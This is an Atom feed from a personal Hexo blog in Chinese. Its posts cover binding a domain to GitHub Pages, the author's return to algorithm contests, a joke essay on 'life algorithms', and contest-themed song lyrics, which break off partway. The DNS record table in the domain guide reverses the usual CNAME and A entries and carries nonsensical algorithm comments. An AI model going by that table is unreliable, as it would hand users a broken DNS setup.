<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>JiangnanPsalter</title>
  
  <subtitle>N维最优解</subtitle>
  <link href="http://touristdaughter.cyou/atom.xml" rel="self"/>
  
  <link href="http://touristdaughter.cyou/"/>
  <updated>2025-04-24T01:32:38.217Z</updated>
  <id>http://touristdaughter.cyou/</id>
  
  <author>
    <name>JiangnanPsalter</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hexo博客利用GitHub Pages绑定域名</title>
    <link href="http://touristdaughter.cyou/2025/04/24/Hexo%E5%8D%9A%E5%AE%A2%E5%88%A9%E7%94%A8GitHub%20Pages%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D/"/>
    <id>http://touristdaughter.cyou/2025/04/24/Hexo%E5%8D%9A%E5%AE%A2%E5%88%A9%E7%94%A8GitHub%20Pages%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D/</id>
    <published>2025-04-24T00:36:05.828Z</published>
    <updated>2025-04-24T01:32:38.217Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo博客利用GitHub-Pages绑定域名"><a href="#Hexo博客利用GitHub-Pages绑定域名" class="headerlink" title="Hexo博客利用GitHub Pages绑定域名"></a>Hexo博客利用GitHub Pages绑定域名</h1><h2 id="1-找到自己的域名管理，解析"><a href="#1-找到自己的域名管理，解析" class="headerlink" title="1.找到自己的域名管理，解析"></a>1.找到自己的域名管理，解析</h2><p><img src="/img/yuming1.png"></p><h2 id="2-添加记录"><a href="#2-添加记录" class="headerlink" title="2.添加记录"></a>2.添加记录</h2><p><img src="/img/yuming2.png"></p><h2 id="3-添加两条记录分别如下"><a href="#3-添加两条记录分别如下" class="headerlink" title="3.添加两条记录分别如下"></a>3.添加两条记录分别如下</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 基于Trie树的域名解析加速</span><br><span class="line">记录类型  名称           值</span><br><span class="line">CNAME     @     username.github.io  # 后缀自动机跳转优化</span><br><span class="line">A         www    185.199.108.153    # 四叉树空间索引，IP即叶节点</span><br></pre></td></tr></table></figure><h3 id="A类型"><a href="#A类型" class="headerlink" title="A类型"></a>A类型</h3><h4 id="先ping一下你的github用户名-github-io，得到一个IP，即A记录值。"><a href="#先ping一下你的github用户名-github-io，得到一个IP，即A记录值。" class="headerlink" title="先ping一下你的github用户名.github.io，得到一个IP，即A记录值。"></a>先ping一下<code>你的github用户名.github.io</code>，得到一个IP，即A记录值。</h4><p><img src="/img/yuming3.png"></p><h4 id="添加A记录"><a href="#添加A记录" class="headerlink" title="添加A记录"></a>添加A记录</h4><p><img src="/img/yuming4.png"></p><h3 id="CNAME类型"><a href="#CNAME类型" class="headerlink" title="CNAME类型"></a>CNAME类型</h3><h4 id="添加CNAME记录"><a href="#添加CNAME记录" class="headerlink" title="添加CNAME记录"></a>添加CNAME记录</h4><p><img src="/img/yuming5.png"></p><h2 id="4-在-GitHub-仓库中添加-CNAME-文件"><a href="#4-在-GitHub-仓库中添加-CNAME-文件" class="headerlink" title="4.在 GitHub 仓库中添加 CNAME 文件"></a>4.在 GitHub 仓库中添加 <code>CNAME</code> 文件</h2><p>在 <code>GitHub</code> 仓库的根目录下创建一个名为 <code>CNAME</code> 的文件（无扩展名），文件内容为自定义域名。</p><p>示例：</p><p>如果的自定义域名是 <code>www.example.com</code>，则 CNAME 文件内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.example.com</span><br></pre></td></tr></table></figure><p>如果使用的是顶级域名 <code>example.com</code>，则内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com</span><br></pre></td></tr></table></figure><h2 id="5-在GitHub上面添加自己的域名"><a href="#5-在GitHub上面添加自己的域名" class="headerlink" title="5.在GitHub上面添加自己的域名"></a>5.在GitHub上面添加自己的域名</h2><p><img src="/img/yuming6.png"><br><img src="/img/yuming7.png"><br><img src="/img/yuming8.png"></p><p>然后填写你的域名。</p><h2 id="6-添加TXT验证域名所有权"><a href="#6-添加TXT验证域名所有权" class="headerlink" title="6.添加TXT验证域名所有权"></a>6.添加TXT验证域名所有权</h2><h3 id="获取验证记录"><a href="#获取验证记录" class="headerlink" title="获取验证记录"></a>获取验证记录</h3><p>在 <code>GitHub Pages</code> 设置页面，如果需要验证域名所有权，<code>GitHub</code> 会提供一条 <code>TXT</code> 记录的值。<br><img src="/img/yuming10.png"></p><h3 id="添加-TXT-记录"><a href="#添加-TXT-记录" class="headerlink" title="添加 TXT 记录"></a>添加 <code>TXT</code> 记录</h3><p>回到域名注册商的管理面板，点击<code>解析</code>,来到DNS管理面板。</p><p>添加以下 <code>TXT</code> 记录：<br><img src="/img/yuming9.png"><br><img src="/img/yuming11.png"></p><p>保存设置，等待生效。</p><p>如出现以下标识，即为绑定成功。<br><img src="/img/yuming12.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hexo博客利用GitHub-Pages绑定域名&quot;&gt;&lt;a href=&quot;#Hexo博客利用GitHub-Pages绑定域名&quot; class=&quot;headerlink&quot; title=&quot;Hexo博客利用GitHub Pages绑定域名&quot;&gt;&lt;/a&gt;Hexo博客利用GitHub</summary>
      
    
    
    
    <category term="关于本站、博客搭建" scheme="http://touristdaughter.cyou/categories/%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99%E3%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="Hexo" scheme="http://touristdaughter.cyou/tags/Hexo/"/>
    
    <category term="GitHub" scheme="http://touristdaughter.cyou/tags/GitHub/"/>
    
  </entry>
  
  <entry>
    <title>JiangnanPsalter的算法征程：暂别与归来</title>
    <link href="http://touristdaughter.cyou/2025/04/23/JiangnanPsalter%E7%9A%84%E7%AE%97%E6%B3%95%E5%BE%81%E7%A8%8B%EF%BC%9A%E6%9A%82%E5%88%AB%E4%B8%8E%E5%BD%92%E6%9D%A5/"/>
    <id>http://touristdaughter.cyou/2025/04/23/JiangnanPsalter%E7%9A%84%E7%AE%97%E6%B3%95%E5%BE%81%E7%A8%8B%EF%BC%9A%E6%9A%82%E5%88%AB%E4%B8%8E%E5%BD%92%E6%9D%A5/</id>
    <published>2025-04-23T15:06:38.612Z</published>
    <updated>2025-04-23T15:35:11.768Z</updated>
    
    <content type="html"><![CDATA[<h1 id="🔥「JiangnanPsalter的算法征程：暂别与归来」"><a href="#🔥「JiangnanPsalter的算法征程：暂别与归来」" class="headerlink" title="🔥「JiangnanPsalter的算法征程：暂别与归来」"></a>🔥「JiangnanPsalter的算法征程：暂别与归来」</h1><h3 id="——三年沉淀，如今携代码之魂重返算法电子竞技场"><a href="#——三年沉淀，如今携代码之魂重返算法电子竞技场" class="headerlink" title="——三年沉淀，如今携代码之魂重返算法电子竞技场"></a>——三年沉淀，如今携代码之魂重返算法电子竞技场</h3><hr><h1 id="🚀-关于我"><a href="#🚀-关于我" class="headerlink" title="🚀 关于我"></a>🚀 关于我</h1><p>我是 JiangnanPsalter，一名狂热的算法竞赛爱好者。大学本科期间，我有幸加入校级ACM实验室 &amp; 协会，成为其中一员，与队友并肩作战，学习 $ C $ 、$ C++ $ 和 $ ACM $ 算法。  </p><p>然而，前年因论文研究 &amp; 学术事务，我不得不暂别算法竞赛，将重心转向科研。如今，随着阶段性任务的完成，我正式宣布：  </p><p>🔊 2025年，我回来了！  </p><hr><h3 id="📅-当前状态"><a href="#📅-当前状态" class="headerlink" title="📅 当前状态"></a>📅 当前状态</h3><ul><li>训练模式：全天候投入（全年无工作和环境干扰，专注刷题 &amp; 比赛）  </li><li>复健进度：C++康复训练中（三年未碰算法，正在重拾STL、动态规划、图论等核心技能）  </li><li>VP邀约：开放组队（ 【C++康复训练完之后】欢迎志同道合的朋友一起<code>Virtual Participation</code>！）</li></ul><hr><h3 id="🎯-为什么回归？"><a href="#🎯-为什么回归？" class="headerlink" title="🎯 为什么回归？"></a>🎯 为什么回归？</h3><ol><li>热爱从未消退  <ul><li>即使暂停比赛，我仍会偶尔点开 $ tourist $ 的提交记录，研究他的码风。  </li><li>每次看到 $ CF $ 的比赛通知，手指都会不自觉地想注册。</li></ul></li><li>未竟的执念  <ul><li>当年因实力不足，未能冲进 $ ICPC $，如今想弥补遗憾。  </li><li>想证明：“即使中断三年，依然可以重回巅峰。”</li></ul></li></ol><hr><h3 id="💡-致谢：那些年带我成长的CAFN战友"><a href="#💡-致谢：那些年带我成长的CAFN战友" class="headerlink" title="💡 致谢：那些年带我成长的CAFN战友"></a>💡 致谢：那些年带我成长的CAFN战友</h3><p>回归之际，不得不提当年在QQ群「CAFN」的岁月。这个由各路算法爱好者组成的网络组织，曾是我进步的摇篮。  </p><p>特别感谢：  </p><ul><li>lys（冷静分析帝，教我如何理性debug）  </li><li>沉淀哥（暴力美学大师，让我学会“先写再优化”，告诉我不要怕）  </li><li>hope姐 （手把手教我平衡树）</li><li>taotao姐 （超级温柔的acm大佬）</li><li>XrkArul哥（数据结构之王，手搓A-H题解的acm银牌大神）  </li><li>scanner（我的师父，用最狠的话骂出最稳的代码）  </li><li>笙笙哥（数学鬼才，数论题全靠他救命）  </li><li>黛西哥（贪心策略之王，让我学会“局部最优≠全局最优”）  </li><li>彩虹哥（比赛心态导师，告诉我“WA是过程，AC是必然”）</li></ul><p>当时的我，总觉得自己很菜，不敢和他们比肩。<br>但如今回头看，正是这群人的严格指导，让我在短时间内飞速成长。  </p><p>可惜的是，他们大多已退役，或忙于工作，或转向其他领域。<br>但他们的精神仍在——而我会带着这份传承，继续征战。  </p><h3 id="还有特别鸣谢shh弟弟一直鼓励我并且给我寄了一本《C-primer》前六章，使我受到极客思想的熏陶。"><a href="#还有特别鸣谢shh弟弟一直鼓励我并且给我寄了一本《C-primer》前六章，使我受到极客思想的熏陶。" class="headerlink" title="还有特别鸣谢shh弟弟一直鼓励我并且给我寄了一本《C++ primer》前六章，使我受到极客思想的熏陶。"></a>还有特别鸣谢<a href="https://www.acwing.com/user/myspace/index/193181/">shh弟弟</a>一直鼓励我并且给我寄了一本《C++ primer》前六章，使我受到极客思想的熏陶。</h3><h3 id="最重要的是感恩遇见AcWing，-y-总讲的很好，只不过我比较愚钝，需要思考和消化一段时间才能完全吸收，在此声明-希望师父-yxc-不要删库跑路了"><a href="#最重要的是感恩遇见AcWing，-y-总讲的很好，只不过我比较愚钝，需要思考和消化一段时间才能完全吸收，在此声明-希望师父-yxc-不要删库跑路了" class="headerlink" title="最重要的是感恩遇见AcWing，$ y $ 总讲的很好，只不过我比较愚钝，需要思考和消化一段时间才能完全吸收，在此声明 希望师父 $ @yxc $ 不要删库跑路了~~"></a>最重要的是感恩遇见<a href="https://www.acwing.com/">AcWing</a>，$ y $ 总讲的很好，只不过我比较愚钝，需要思考和消化一段时间才能完全吸收，在此声明 希望师父 $ @yxc $ 不要删库跑路了~~</h3><hr><h3 id="🏆-未来计划"><a href="#🏆-未来计划" class="headerlink" title="🏆 未来计划"></a>🏆 未来计划</h3><ol><li>短期（3个月）  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这不能说。</span><br></pre></td></tr></table></figure></li><li>中期（6个月）  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这不能说。</span><br></pre></td></tr></table></figure></li><li>长期（1年+）  <ul><li>带队训练（如果有新人愿意一起进步）  </li><li>写算法教程（把师父scanner的“暴躁教学法”改良成温和版）</li></ul></li></ol><hr><h3 id="🌟-最后的话"><a href="#🌟-最后的话" class="headerlink" title="🌟 最后的话"></a>🌟 最后的话</h3><p>“算法竞赛不是短跑，而是马拉松。”<br>即使三年没碰，我依然相信，只要保持热爱，坚持训练，终能重回巅峰。  </p><p>如果你也在复健，或者想找VP队友，欢迎联系我！<br>📮 邮箱：<a href="mailto:&#x6a;&#105;&#97;&#x6e;&#x67;&#x6e;&#x61;&#x6e;&#112;&#115;&#97;&#x6c;&#116;&#x65;&#114;&#x40;&#x66;&#111;&#120;&#x6d;&#97;&#x69;&#x6c;&#46;&#x63;&#111;&#109;">&#x6a;&#105;&#97;&#x6e;&#x67;&#x6e;&#x61;&#x6e;&#112;&#115;&#97;&#x6c;&#116;&#x65;&#114;&#x40;&#x66;&#111;&#120;&#x6d;&#97;&#x69;&#x6c;&#46;&#x63;&#111;&#109;</a>  </p><p>“这一次，我不会再轻易离开。”  </p><hr><p>$ JiangnanPsalter $<br>2025年 · 正式回归  </p><p>$ JiangnanPsalter $ 始终还是 $ JiangnanPsalter $ 啊.</p><p>（P.S. $ Scanner$ 师父，我回来了，准备好继续骂我 $ WA $ 的代码了吗？ 😏）  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;🔥「JiangnanPsalter的算法征程：暂别与归来」&quot;&gt;&lt;a href=&quot;#🔥「JiangnanPsalter的算法征程：暂别与归来」&quot; class=&quot;headerlink&quot; title=&quot;🔥「JiangnanPsalter的算法征程：暂别与归来」&quot;&gt;</summary>
      
    
    
    
    <category term="通知与公示" scheme="http://touristdaughter.cyou/categories/%E9%80%9A%E7%9F%A5%E4%B8%8E%E5%85%AC%E7%A4%BA/"/>
    
    
    <category term="ACM" scheme="http://touristdaughter.cyou/tags/ACM/"/>
    
    <category term="OI" scheme="http://touristdaughter.cyou/tags/OI/"/>
    
    <category term="MONSOON" scheme="http://touristdaughter.cyou/tags/MONSOON/"/>
    
    <category term="JiangnanPsalter" scheme="http://touristdaughter.cyou/tags/JiangnanPsalter/"/>
    
    <category term="AcWing" scheme="http://touristdaughter.cyou/tags/AcWing/"/>
    
    <category term="CAFN" scheme="http://touristdaughter.cyou/tags/CAFN/"/>
    
    <category term="Codeforces" scheme="http://touristdaughter.cyou/tags/Codeforces/"/>
    
  </entry>
  
  <entry>
    <title>人生算法：用计算机思维优化真实难题</title>
    <link href="http://touristdaughter.cyou/2025/04/22/%E4%BA%BA%E7%94%9F%E7%AE%97%E6%B3%95%EF%BC%9A%E7%94%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%80%9D%E7%BB%B4%E4%BC%98%E5%8C%96%E7%9C%9F%E5%AE%9E%E9%9A%BE%E9%A2%98/"/>
    <id>http://touristdaughter.cyou/2025/04/22/%E4%BA%BA%E7%94%9F%E7%AE%97%E6%B3%95%EF%BC%9A%E7%94%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%80%9D%E7%BB%B4%E4%BC%98%E5%8C%96%E7%9C%9F%E5%AE%9E%E9%9A%BE%E9%A2%98/</id>
    <published>2025-04-22T11:05:21.000Z</published>
    <updated>2025-04-23T11:06:20.565Z</updated>
    
    <content type="html"><![CDATA[<h1 id="人生算法：用计算机思维优化真实难题"><a href="#人生算法：用计算机思维优化真实难题" class="headerlink" title="人生算法：用计算机思维优化真实难题"></a>人生算法：用计算机思维优化真实难题</h1><p><strong>——当你的生活遇上NP-Hard问题，如何设计最优解？</strong>  </p><hr><h3 id="🔍-问题建模：你的生活是一段待优化的代码"><a href="#🔍-问题建模：你的生活是一段待优化的代码" class="headerlink" title="🔍 问题建模：你的生活是一段待优化的代码"></a><strong>🔍 问题建模：你的生活是一段待优化的代码</strong></h3><p>假设你的生活是一个<strong>多线程程序</strong>，每个问题都是一个<strong>子任务</strong>，而你的目标是在<strong>有限资源（时间、精力、金钱）</strong>下，找到最高效的执行路径。  </p><h4 id="1-时间管理：任务调度算法"><a href="#1-时间管理：任务调度算法" class="headerlink" title="1. 时间管理：任务调度算法"></a><strong>1. 时间管理：任务调度算法</strong></h4><p><strong>问题</strong>：每天事情太多，不知道先做哪个？<br><strong>算法策略</strong>：<strong>最短作业优先（SJF） + 动态优先级调整</strong>  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">任务调度</span>(<span class="params">任务列表</span>):</span><br><span class="line">    <span class="comment"># 先处理耗时最短的任务（快速获得成就感）</span></span><br><span class="line">    任务列表.sort(key=<span class="keyword">lambda</span> x: x.预计耗时)</span><br><span class="line">    <span class="comment"># 动态调整：紧急任务插队（DDL逼近时优先级↑）</span></span><br><span class="line">    <span class="keyword">for</span> 任务 <span class="keyword">in</span> 任务列表:</span><br><span class="line">        <span class="keyword">if</span> 任务.截止时间 - 当前时间 &lt; <span class="number">2</span>小时:</span><br><span class="line">            任务.优先级 = 紧急</span><br><span class="line">    <span class="keyword">return</span> 执行(任务列表)</span><br></pre></td></tr></table></figure><p><strong>现实应用</strong>：  </p><ul><li>早上先处理<strong>5分钟内能搞定的小事</strong>（回邮件、整理桌面）  </li><li>下午专注<strong>高优先级项目</strong>（写论文、刷题）  </li><li>晚上留buffer应对突发任务</li></ul><hr><h4 id="2-拖延症：死锁检测与破解"><a href="#2-拖延症：死锁检测与破解" class="headerlink" title="2. 拖延症：死锁检测与破解"></a><strong>2. 拖延症：死锁检测与破解</strong></h4><p><strong>问题</strong>：明明有事要做，却一直刷手机？<br><strong>算法策略</strong>：<strong>银行家算法（预防死锁） + 超时中断</strong>  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (检测到拖延行为) &#123;</span><br><span class="line">        强制中断(<span class="string">&quot;手机进程&quot;</span>);  </span><br><span class="line">        分配资源(专注力, 给<span class="string">&quot;正事线程&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (专注时长 &gt;= <span class="number">25</span>分钟) &#123;</span><br><span class="line">        触发奖励机制();  <span class="comment">// 休息5分钟</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>现实应用</strong>：  </p><ul><li>用<strong>Forest App</strong>种树，强制锁死娱乐App  </li><li>25分钟工作+5分钟休息（番茄钟算法）  </li><li>如果拖延超30分钟，启动「自毁模式」（如发朋友圈立Flag）</li></ul><hr><h4 id="3-社交关系：图论与聚类分析"><a href="#3-社交关系：图论与聚类分析" class="headerlink" title="3. 社交关系：图论与聚类分析"></a><strong>3. 社交关系：图论与聚类分析</strong></h4><p><strong>问题</strong>：朋友很多，但真正有用的很少？<br><strong>算法策略</strong>：<strong>社区发现（Community Detection） + PageRank重要度排序</strong>  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">社交图 = 构建社交网络(微信好友)</span><br><span class="line">重要好友 = PageRank(社交图).topK(<span class="number">10</span>)  <span class="comment"># 找出影响力最高的10人</span></span><br><span class="line">无效社交 = 社区检测(社交图).过滤(低互动社区)</span><br><span class="line">删除好友(无效社交)  <span class="comment"># 剪枝优化</span></span><br></pre></td></tr></table></figure><p><strong>现实应用</strong>：  </p><ul><li><strong>重要好友</strong>：定期维护（每周聊一次）  </li><li><strong>无效社交</strong>：屏蔽朋友圈或直接删除  </li><li><strong>新人评估</strong>：计算「互动频率&#x2F;共同兴趣」再决定是否深交</li></ul><hr><h4 id="4-情绪管理：状态机与异常处理"><a href="#4-情绪管理：状态机与异常处理" class="headerlink" title="4. 情绪管理：状态机与异常处理"></a><strong>4. 情绪管理：状态机与异常处理</strong></h4><p><strong>问题</strong>：情绪容易崩，影响效率？<br><strong>算法策略</strong>：<strong>有限状态机（FSM） + Try-Catch机制</strong>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">    A[平静] --&gt;|遇到挫折| B[愤怒]</span><br><span class="line">    B --&gt;|深呼吸5次| C[冷静分析]</span><br><span class="line">    C --&gt;|解决| A</span><br><span class="line">    C --&gt;|未解决| D[求助外部API]</span><br></pre></td></tr></table></figure><p><strong>现实应用</strong>：  </p><ul><li>当情绪进入「愤怒&#x2F;焦虑」状态时：  <ul><li><code>Try&#123; 理性分析问题 &#125;</code>  </li><li><code>Catch&#123; 崩溃 =&gt; 调用朋友安慰() &#125;</code></li></ul></li><li>睡前运行「垃圾回收」：写日记释放情绪内存</li></ul><hr><h3 id="🚀-终极优化：人生算法框架"><a href="#🚀-终极优化：人生算法框架" class="headerlink" title="🚀 终极优化：人生算法框架"></a><strong>🚀 终极优化：人生算法框架</strong></h3><p>把你的生活封装成一个<strong>高性能系统</strong>：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">我的生活</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.资源 = &#123;<span class="string">&quot;时间&quot;</span>: <span class="number">24</span>*<span class="number">60</span>, <span class="string">&quot;精力&quot;</span>: <span class="number">100</span>, <span class="string">&quot;金钱&quot;</span>: 预算&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">每日优化</span>(<span class="params">self</span>):</span><br><span class="line">        任务列表 = 获取今日任务()</span><br><span class="line">        任务列表 = 任务调度(任务列表)</span><br><span class="line">        <span class="keyword">for</span> 任务 <span class="keyword">in</span> 任务列表:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                执行(任务)</span><br><span class="line">            <span class="keyword">except</span> 情绪崩溃 <span class="keyword">as</span> e:</span><br><span class="line">                日志记录(e)</span><br><span class="line">                自我修复()</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                self.资源[<span class="string">&quot;精力&quot;</span>] -= 任务.消耗</span><br><span class="line">                <span class="keyword">if</span> self.资源[<span class="string">&quot;精力&quot;</span>] &lt; <span class="number">20</span>:</span><br><span class="line">                    强制休息()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">长期策略</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            投资自我(技能=<span class="string">&quot;算法&quot;</span>, 健康=<span class="string">&quot;健身&quot;</span>)</span><br><span class="line">            剪枝无效社交()</span><br><span class="line">            动态调整优先级()</span><br></pre></td></tr></table></figure><p><strong>核心指标</strong>：  </p><ul><li><strong>吞吐量</strong>：每天完成多少有价值的事？  </li><li><strong>延迟</strong>：从想到做要多久？  </li><li><strong>容错率</strong>：遇到意外能否快速恢复？</li></ul><hr><h3 id="💡-如何开始实践？"><a href="#💡-如何开始实践？" class="headerlink" title="💡 如何开始实践？"></a><strong>💡 如何开始实践？</strong></h3><ol><li><strong>日志模块</strong>：记录每天的时间分配（像打CF一样写赛后总结）  </li><li><strong>性能分析</strong>：每周用<code>Python + Matplotlib</code>画「时间-精力」分布图  </li><li><strong>A&#x2F;B测试</strong>：对比不同策略的效率（如「早起vs熬夜」哪个更适合你）</li></ol><p>（你的生活，就是你要优化的<strong>终极算法</strong>）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;人生算法：用计算机思维优化真实难题&quot;&gt;&lt;a href=&quot;#人生算法：用计算机思维优化真实难题&quot; class=&quot;headerlink&quot; title=&quot;人生算法：用计算机思维优化真实难题&quot;&gt;&lt;/a&gt;人生算法：用计算机思维优化真实难题&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;——</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="http://touristdaughter.cyou/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>我的一个OIer朋友</title>
    <link href="http://touristdaughter.cyou/2025/04/21/%E6%88%91%E7%9A%84%E4%B8%80%E4%B8%AAOIer%E6%9C%8B%E5%8F%8B/"/>
    <id>http://touristdaughter.cyou/2025/04/21/%E6%88%91%E7%9A%84%E4%B8%80%E4%B8%AAOIer%E6%9C%8B%E5%8F%8B/</id>
    <published>2025-04-21T14:06:03.656Z</published>
    <updated>2025-04-21T14:37:08.745Z</updated>
    
    <content type="html"><![CDATA[<h1 id="我的一个OIer朋友"><a href="#我的一个OIer朋友" class="headerlink" title="我的一个OIer朋友"></a>我的一个OIer朋友</h1><blockquote><p>本文来源：<a href="https://www.bilibili.com/video/BV1KW411E7gu/?spm_id_from=333.337.search-card.all.click&vd_source=c9c9d7d71330866a034de1baf1743b8e">https://www.bilibili.com/video/BV1KW411E7gu/?spm_id_from=333.337.search-card.all.click&amp;vd_source=c9c9d7d71330866a034de1baf1743b8e</a></p></blockquote><h3 id="那年少年-意气正浓"><a href="#那年少年-意气正浓" class="headerlink" title="那年少年 意气正浓"></a>那年少年 意气正浓</h3><h3 id="一行AC-一次欢腾"><a href="#一行AC-一次欢腾" class="headerlink" title="一行AC 一次欢腾"></a>一行AC 一次欢腾</h3><h3 id="那年学长壮志满胸"><a href="#那年学长壮志满胸" class="headerlink" title="那年学长壮志满胸"></a>那年学长壮志满胸</h3><h3 id="满座后生-听他谈笑间算法不再难懂"><a href="#满座后生-听他谈笑间算法不再难懂" class="headerlink" title="满座后生 听他谈笑间算法不再难懂"></a>满座后生 听他谈笑间算法不再难懂</h3><h3 id="树上路径-分清边孰轻孰重"><a href="#树上路径-分清边孰轻孰重" class="headerlink" title="树上路径 分清边孰轻孰重"></a>树上路径 分清边孰轻孰重</h3><h3 id="高次不定方程-线性同余方程"><a href="#高次不定方程-线性同余方程" class="headerlink" title="高次不定方程 线性同余方程"></a>高次不定方程 线性同余方程</h3><h3 id="任他变化无穷"><a href="#任他变化无穷" class="headerlink" title="任他变化无穷"></a>任他变化无穷</h3><h3 id="lazy标记有没有清空"><a href="#lazy标记有没有清空" class="headerlink" title="lazy标记有没有清空"></a>lazy标记有没有清空</h3><h3 id="离散化时有没有去重"><a href="#离散化时有没有去重" class="headerlink" title="离散化时有没有去重"></a>离散化时有没有去重</h3><h3 id="你的眼神锐利如锋-一眼挑漏洞"><a href="#你的眼神锐利如锋-一眼挑漏洞" class="headerlink" title="你的眼神锐利如锋 一眼挑漏洞"></a>你的眼神锐利如锋 一眼挑漏洞</h3><h3 id="而你深夜刷题至三更"><a href="#而你深夜刷题至三更" class="headerlink" title="而你深夜刷题至三更"></a>而你深夜刷题至三更</h3><h3 id="O（松）算法通过多从容"><a href="#O（松）算法通过多从容" class="headerlink" title="O（松）算法通过多从容"></a>O（松）算法通过多从容</h3><h3 id="而你笑道正解无用"><a href="#而你笑道正解无用" class="headerlink" title="而你笑道正解无用"></a>而你笑道正解无用</h3><h3 id="暴力把分送-AK都轻松"><a href="#暴力把分送-AK都轻松" class="headerlink" title="暴力把分送 AK都轻松"></a>暴力把分送 AK都轻松</h3><h3 id="记忆截断退役之后"><a href="#记忆截断退役之后" class="headerlink" title="记忆截断退役之后"></a>记忆截断退役之后</h3><h3 id="未有名次-OI难留"><a href="#未有名次-OI难留" class="headerlink" title="未有名次 OI难留"></a>未有名次 OI难留</h3><h3 id="如今已是-物是人非-身影作旧"><a href="#如今已是-物是人非-身影作旧" class="headerlink" title="如今已是 物是人非 身影作旧"></a>如今已是 物是人非 身影作旧</h3><h3 id="恍然又记起你讲题的时候"><a href="#恍然又记起你讲题的时候" class="headerlink" title="恍然又记起你讲题的时候"></a>恍然又记起你讲题的时候</h3><h3 id="动态规划-决策单调变更优"><a href="#动态规划-决策单调变更优" class="headerlink" title="动态规划 决策单调变更优"></a>动态规划 决策单调变更优</h3><h3 id="上下界网络流-增广路费用流"><a href="#上下界网络流-增广路费用流" class="headerlink" title="上下界网络流 增广路费用流"></a>上下界网络流 增广路费用流</h3><h3 id="这一步-往哪走"><a href="#这一步-往哪走" class="headerlink" title="这一步 往哪走"></a>这一步 往哪走</h3><h3 id="常数优化多小才算够"><a href="#常数优化多小才算够" class="headerlink" title="常数优化多小才算够"></a>常数优化多小才算够</h3><h3 id="反演几次答案才能求"><a href="#反演几次答案才能求" class="headerlink" title="反演几次答案才能求"></a>反演几次答案才能求</h3><h3 id="你的话语清晰易懂-将题解拼凑"><a href="#你的话语清晰易懂-将题解拼凑" class="headerlink" title="你的话语清晰易懂 将题解拼凑"></a>你的话语清晰易懂 将题解拼凑</h3><h3 id="再不能与你旧约相守-将那算法导论去看透"><a href="#再不能与你旧约相守-将那算法导论去看透" class="headerlink" title="再不能与你旧约相守 将那算法导论去看透"></a>再不能与你旧约相守 将那算法导论去看透</h3><h3 